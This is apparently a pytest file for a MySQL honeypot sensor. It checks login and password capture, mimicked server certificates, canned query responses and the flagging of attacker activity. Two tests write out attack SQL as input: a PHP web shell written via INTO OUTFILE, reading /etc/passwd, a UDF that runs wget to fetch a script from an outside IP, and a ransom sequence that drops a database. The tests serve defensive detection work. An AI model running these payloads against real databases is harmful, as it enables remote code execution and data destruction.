"""Protocol tests with a real client (PyMySQL) against the running sensor."""

from __future__ import annotations

import asyncio
import hashlib
import ssl
from collections.abc import Callable
from typing import Any

import pymysql
import pytest
from conftest import VERSION, HarnessFactory

from mysql_sensor import wire
from mysql_sensor.config import parse_accounts


async def run[**P, R](fn: Callable[P, R], *a: P.args, **kw: P.kwargs) -> R:
    return await asyncio.to_thread(fn, *a, **kw)


def q(conn: Any, sql: str) -> tuple[tuple[Any, ...], tuple[Any, ...]]:
    with conn.cursor() as cur:
        cur.execute(sql)
        return cur.fetchall(), cur.description


async def test_root_empty_password_and_version(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect()
        assert conn.server_version == VERSION
        assert conn.protocol_version == 10
        rows, _ = await run(q, conn, "SELECT @@version, version(), @@version_comment")
        assert rows == ((VERSION, VERSION, "(Ubuntu)"),)
        rows, _ = await run(q, conn, "select database(), user(), current_user()")
        assert rows == ((None, "root@127.0.0.1", "root@%"),)
        await run(conn.close)
        logins = await h.events("login_attempt")
        assert len(logins) == 1
        d = logins[0].data
        assert d["username"] == "root" and d["success"] is True and d["password"] == ""
        assert d["password_source"] == "empty"
        assert logins[0].sensor == "mysql" and logins[0].dst_port == 3306
        disc = await h.wait_disconnects(1)
        assert disc[0].data["reason"] == "client_quit" and disc[0].data["logged_in"] is True


@pytest.mark.parametrize("plugin", ["mysql_native_password", "caching_sha2_password"])
async def test_known_weak_password_scramble_match(
    make_harness: HarnessFactory, plugin: str
) -> None:
    async with make_harness(default_plugin=plugin) as h:
        conn = await h.aconnect(user="admin", password="admin")
        await run(conn.close)
        d = (await h.events("login_attempt"))[0].data
        assert d["success"] is True and d["password"] == "admin"
        assert d["password_source"] == "scramble_match" and d["method"] == plugin
        assert len(d["auth_response_preview"]) == 16  # short preview only


async def test_native_wrong_password_denied_without_cleartext(make_harness: HarnessFactory) -> None:
    async with make_harness(default_plugin="mysql_native_password") as h:
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await h.aconnect(user="root", password="nope-nope")
        assert exc.value.args[0] == 1045
        assert (
            exc.value.args[1] == "Access denied for user 'root'@'127.0.0.1' (using password: YES)"
        )
        d = (await h.events("login_attempt"))[0].data
        assert d["success"] is False and d["password"] is None
        assert d["method"] == "mysql_native_password"
        assert "nope-nope" not in str(d)


async def test_caching_sha2_full_auth_rsa_records_cleartext(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await h.aconnect(user="deploy", password="Sup3r-Secret!", ssl_disabled=True)
        assert exc.value.args[0] == 1045
        assert "using password: YES" in exc.value.args[1]
        d = (await h.events("login_attempt"))[0].data
        assert d["password"] == "Sup3r-Secret!" and d["password_source"] == "rsa_cleartext"
        assert d["success"] is False and d["username"] == "deploy"


async def test_access_denied_using_password_no(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await h.aconnect(user="nobody", password="")
        assert "(using password: NO)" in exc.value.args[1]


async def test_tls_login_records_cleartext_and_chain_verifies(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        ca = str(h.identity.tls_chain.parent / "ca.pem")
        conn = await h.aconnect(
            user="mysql",
            password="mysql",
            ssl_ca=ca,
            ssl_verify_cert=True,
            ssl_verify_identity=False,
        )
        assert conn.server_version == VERSION
        rows, _ = await run(q, conn, "select 1")
        assert rows == ((1,),)
        await run(conn.close)
        d = (await h.events("login_attempt"))[0].data
        assert d["tls"] is True and d["password"] == "mysql"
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await h.aconnect(
                user="zed",
                password="p4ss-tls",
                ssl_ca=ca,
                ssl_verify_cert=True,
                ssl_verify_identity=False,
            )
        assert exc.value.args[0] == 1045
        denied = [e for e in await h.events("login_attempt") if e.data["username"] == "zed"]
        assert denied[0].data["password"] == "p4ss-tls"
        assert denied[0].data["password_source"] == "tls_cleartext"


async def test_tls_server_certificate_looks_like_mysql(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        ca = str(h.identity.tls_chain.parent / "ca.pem")
        ctx = ssl.create_default_context(cafile=ca)
        ctx.check_hostname = False
        conn = await h.aconnect(
            user="root", ssl_ca=ca, ssl_verify_cert=True, ssl_verify_identity=False
        )
        sock = conn._sock
        cert = sock.getpeercert()
        subject = dict(x[0] for x in cert["subject"])
        assert subject["commonName"] == "MySQL_Server_8.0.43_Auto_Generated_Server_Certificate"
        await run(conn.close)


async def test_clear_password_switch_option(make_harness: HarnessFactory) -> None:
    async with make_harness(clear_password_switch=True) as h:
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await h.aconnect(
                user="x",
                password="hunter2",
                auth_plugin_map={
                    "mysql_clear_password": lambda c: type(
                        "P", (), {"authenticate": lambda s, p: c.password.encode() + b"\0"}
                    )()
                }
                if False
                else None,
            )
        # PyMySQL answers the switch request with mysql_clear_password itself.
        assert exc.value.args[0] in (1045, 2059)
        d = (await h.events("login_attempt"))[0].data
        assert d["password_source"] == "cleartext_switch" and d["password"] == "hunter2"


async def test_clear_password_switch_off_by_default(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        with pytest.raises(pymysql.err.OperationalError):
            await h.aconnect(user="x", password="hunter2")
        d = (await h.events("login_attempt"))[0].data
        assert d["password_source"] != "cleartext_switch"


async def test_database_in_handshake(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect(database="shop")
        rows, _ = await run(q, conn, "select database()")
        assert rows == (("shop",),)
        await run(conn.close)
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await h.aconnect(database="nosuchdb")
        assert exc.value.args[0] == 1049


async def test_ping_init_db_and_quit(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect()
        await run(conn.ping, False)
        await run(conn.select_db, "shop")
        rows, _ = await run(q, conn, "show tables")
        assert [r[0] for r in rows] == ["customers", "orders", "products"]
        with pytest.raises(pymysql.err.OperationalError) as exc:
            await run(conn.select_db, "nope")
        assert exc.value.args[0] == 1049
        await run(conn.close)
        cmds = await h.events("command")
        assert any(c.data["protocol_command"] == "COM_INIT_DB" for c in cmds)


async def test_canned_queries(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect()
        rows, desc = await run(q, conn, "SHOW DATABASES")
        assert [r[0] for r in rows] == [
            "information_schema",
            "mysql",
            "performance_schema",
            "shop",
            "sys",
        ]
        assert desc[0][0] == "Database"
        rows, _ = await run(q, conn, "USE shop")
        rows, desc = await run(q, conn, "SELECT * FROM customers LIMIT 3")
        assert len(rows) == 3 and [d[0] for d in desc][:3] == ["id", "first_name", "last_name"]
        assert rows[0][0] == 1 and rows[0][3].endswith("@example.com")
        assert rows[0][4].startswith("+1-555-01")
        rows, _ = await run(q, conn, "select count(*) from customers")
        assert rows == ((1284,),)
        rows, _ = await run(q, conn, "select email from customers where id = 7")
        assert len(rows) == 1 and "7@example.com" in rows[0][0]
        rows, _ = await run(q, conn, "SELECT id, total FROM orders LIMIT 2, 2")
        assert [r[0] for r in rows] == [3, 4]
        rows, _ = await run(q, conn, "show variables like 'version%'")
        assert ("version", VERSION) in rows
        rows, _ = await run(
            q, conn, "select * from information_schema.schemata where schema_name = 'shop'"
        )
        assert len(rows) == 1
        rows, _ = await run(q, conn, "select load_file('/etc/passwd')")
        assert rows == ((None,),)
        rows, _ = await run(q, conn, "show grants")
        assert "GRANT ALL PRIVILEGES" in rows[0][0]
        await run(q, conn, "set names utf8mb4")
        await run(q, conn, "SET @a = 5")
        rows, _ = await run(q, conn, "select @a")
        assert rows == (("5",),)
        with pytest.raises(pymysql.err.ProgrammingError) as exc:
            await run(q, conn, "select * from nosuch")
        assert exc.value.args[0] == 1146
        with pytest.raises(pymysql.err.ProgrammingError) as exc:
            await run(q, conn, "selekt 1")
        assert exc.value.args[0] == 1064
        await run(conn.close)


async def test_flags_and_downloads(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect()
        script = [
            "select '<?php system($_GET[0]);?>' into outfile '/var/www/html/x.php'",
            "select load_file('/etc/passwd')",
            "create function sys_exec returns int soname 'lib_mysqludf_sys.so'",
            "select sys_exec('wget http://198.51.100.9/x.sh -O /tmp/x.sh')",
            "set global general_log_file = '/var/www/html/shell.php'",
        ]
        for sql in script:
            try:
                await run(q, conn, sql)
            except pymysql.err.MySQLError:
                pass
        await run(conn.close)
        cmds = await h.events("command")
        flags = {f for c in cmds for f in c.data["flags"]}
        assert {"into_outfile", "load_file", "udf", "log_file_write"} <= flags
        downloads = await h.events("download_attempt")
        assert downloads[0].data["url"] == "http://198.51.100.9/x.sh"
        assert downloads[0].data["tool"] == "wget"


async def test_ransomware_script(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect()
        script = [
            "SHOW DATABASES",
            "DROP DATABASE shop",
            "CREATE DATABASE PLEASE_READ_ME",
            "USE PLEASE_READ_ME",
            "CREATE TABLE WARNING (id INT, bitcoin_address TEXT, note TEXT)",
            "INSERT INTO WARNING VALUES (1, 'bc1qexampleexampleexample', 'To recover your data send 0.05 BTC')",
            "SHOW DATABASES",
            "SHOW TABLES",
            "SELECT * FROM WARNING",
        ]
        results = []
        for sql in script:
            results.append((await run(q, conn, sql))[0])
        assert [r[0] for r in results[0]].count("shop") == 1
        assert "shop" not in [r[0] for r in results[6]]
        assert "PLEASE_READ_ME" in [r[0] for r in results[6]]
        assert results[7] == (("WARNING",),)
        assert results[8] == ()
        await run(conn.close)
        cmds = await h.events("command")
        by = {
            c.data["input"].split()[0] + " " + c.data["input"].split()[1]: c.data["flags"]
            for c in cmds
        }
        assert "drop_database" in by["DROP DATABASE"]
        assert "ransom_note" in by["INSERT INTO"]
        assert "ransom_note" in by["CREATE DATABASE"]
        assert "ransom_note" in by["CREATE TABLE"]
        assert by["SHOW DATABASES"] == ["show_databases"]


async def test_multi_statements(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect(client_flag=pymysql.constants.CLIENT.MULTI_STATEMENTS)

        def multi() -> list[tuple[tuple[object, ...], ...]]:
            with conn.cursor() as cur:
                cur.execute("select 1; select 2; show databases")
                sets = [cur.fetchall()]
                while cur.nextset():
                    sets.append(cur.fetchall())
            return sets

        sets = await run(multi)
        assert sets[0] == ((1,),) and sets[1] == ((2,),) and len(sets[2]) == 5
        await run(conn.close)
        plain = await h.aconnect()
        with pytest.raises(pymysql.err.ProgrammingError) as exc:
            await run(q, plain, "select 1; select 2")
        assert exc.value.args[0] == 1064
        await run(plain.close)


async def test_big_query_is_capped_but_recorded(make_harness: HarnessFactory) -> None:
    async with make_harness(capture_bytes=2000) as h:
        conn = await h.aconnect()
        big = "select '" + "A" * 50_000 + "'"
        rows, _ = await run(q, conn, big)
        assert len(rows) == 1
        await run(conn.close)
        cmd = (await h.events("command"))[-1].data
        assert cmd["truncated"] is True and cmd["length"] > 50_000 and len(cmd["input"]) <= 2000


async def test_event_stream_shape(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect(program_name="sqlmap-like")
        await run(q, conn, "select 1")
        await run(conn.close)
        await h.wait_disconnects(1)
        events = await h.events()
        kinds = [e.type for e in events]
        assert kinds[:2] == ["connect", "login_attempt"] and kinds[-1] == "disconnect"
        assert set(kinds[2:-1]) == {"command"}
        assert events[-2].data["input"] == "select 1"
        assert len({e.session_id for e in events}) == 1
        attrs = events[1].data["client_attrs"]
        assert attrs["program_name"] == "sqlmap-like" and attrs["_client_name"] == "pymysql"


async def test_stock_8_0_capabilities_and_max_allowed_packet(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        reader, writer = await asyncio.open_connection("127.0.0.1", h.port)
        head = await reader.readexactly(4)
        hs = await reader.readexactly(int.from_bytes(head[:3], "little"))
        writer.close()
        end = hs.index(b"\x00", 1) + 1 + 4 + 8 + 1  # version, connection id, salt part 1, filler
        lower = int.from_bytes(hs[end : end + 2], "little")
        upper = int.from_bytes(hs[end + 5 : end + 7], "little")
        caps = lower | upper << 16
        assert lower == 0xFFDF  # a stock 8.0 says 0xFFFF; only CLIENT_COMPRESS is missing
        for flag in (
            wire.CLIENT_SESSION_TRACK,
            wire.CLIENT_OPTIONAL_RESULTSET_METADATA,
            wire.CLIENT_QUERY_ATTRIBUTES,
            wire.CLIENT_DEPRECATE_EOF,
        ):
            assert caps & flag
        assert not caps & (1 << 26)  # no zstd
        conn = await h.aconnect()
        rows, _ = await run(q, conn, "select @@max_allowed_packet, @@global.max_allowed_packet")
        assert rows == ((67108864, 67108864),)
        await run(conn.close)


async def test_pymysql_works_with_session_tracking_ok_packets(make_harness: HarnessFactory) -> None:
    async with make_harness() as h:
        conn = await h.aconnect(client_flag=wire.CLIENT_SESSION_TRACK)
        await run(q, conn, "set @a = 1")
        with conn.cursor() as cur:
            affected = await run(cur.execute, "insert into shop.customers values (1)")
        assert affected >= 0
        rows, _ = await run(q, conn, "select 1")
        assert rows == ((1,),)
        await run(conn.close)


async def test_query_attributes_are_parsed_and_recorded(make_harness: HarnessFactory) -> None:
    from test_limits import native_response, open_raw, read_packet

    async with make_harness() as h:
        reader, writer = await open_raw(h.port)
        await read_packet(reader)
        caps = (
            wire.CLIENT_PROTOCOL_41
            | wire.CLIENT_SECURE_CONNECTION
            | wire.CLIENT_PLUGIN_AUTH
            | wire.CLIENT_QUERY_ATTRIBUTES
            | wire.CLIENT_DEPRECATE_EOF
            | wire.CLIENT_CONNECT_WITH_DB
        )
        body = native_response()
        body = caps.to_bytes(4, "little") + body[4:]
        writer.write(wire.pack(1, body))
        assert (await read_packet(reader))[1][0] == 0x00
        # One attribute: name 'trace', type VAR_STRING, value 'abc'.
        attrs = b"\x01\x01" + b"\x00" + b"\x01" + b"\xfd\x00" + b"\x05trace" + b"\x03abc"
        writer.write(wire.pack(0, bytes([wire.COM_QUERY]) + attrs + b"select 41+1 /* x */"))
        count = (await read_packet(reader))[1]
        assert count == b"\x01"  # one column; no metadata byte, the client did not ask for it
        for _ in range(3):  # column definition, row, final OK(0xFE)
            await read_packet(reader)
        # No attributes at all: count 0, set count 1.
        writer.write(wire.pack(0, bytes([wire.COM_QUERY]) + b"\x00\x01" + b"select 1"))
        assert (await read_packet(reader))[1] == b"\x01"
        for _ in range(3):
            await read_packet(reader)
        # Truncated attribute block: a malformed packet error, not a crash.
        writer.write(wire.pack(0, bytes([wire.COM_QUERY]) + b"\x02\x01\x00"))
        _, err = await read_packet(reader)
        assert err[0] == 0xFF and int.from_bytes(err[1:3], "little") == 1835
        writer.close()
        cmds = await h.events("command")
        assert cmds[0].data["input"] == "select 41+1 /* x */"
        assert cmds[0].data["query_attributes"] == {"trace": "abc"}
        assert cmds[0].data["length"] == len("select 41+1 /* x */")


async def test_certificates_look_like_mysqld_auto_generated(make_harness: HarnessFactory) -> None:
    from cryptography import x509

    async with make_harness() as h:
        directory = h.identity.tls_chain.parent
        leaf = x509.load_pem_x509_certificates((directory / "server-cert.pem").read_bytes())
        ca = x509.load_pem_x509_certificate((directory / "ca.pem").read_bytes())
        assert len(leaf) == 1  # the server presents its own certificate only
        assert leaf[0].serial_number == 2 and ca.serial_number == 1
        assert leaf[0].issuer == ca.subject


def test_scramble_helpers_match_client_library() -> None:
    from pymysql._auth import scramble_caching_sha2, scramble_native_password

    from mysql_sensor import auth

    salt = auth.new_salt()
    assert all(0 < b < 128 and b != 0x24 for b in salt)
    for pw in (b"root", b"x" * 40, b"\xc3\xa9t\xc3\xa9"):
        assert auth.native_scramble(pw, salt) == scramble_native_password(pw, salt)
        assert auth.caching_sha2_scramble(pw, salt) == scramble_caching_sha2(pw, salt)
        assert auth.verify_native(scramble_native_password(pw, salt), pw, salt)
        assert not auth.verify_native(scramble_native_password(pw, salt), pw + b"x", salt)
    assert auth.native_scramble(b"", salt) == b""
    assert hashlib.sha1(b"").digest()  # sanity


def test_accounts_parsing() -> None:
    accounts = parse_accounts("root:,root:toor,admin:a:b,bad, :x")
    assert accounts == {"root": (b"", b"toor"), "admin": (b"a:b",)}
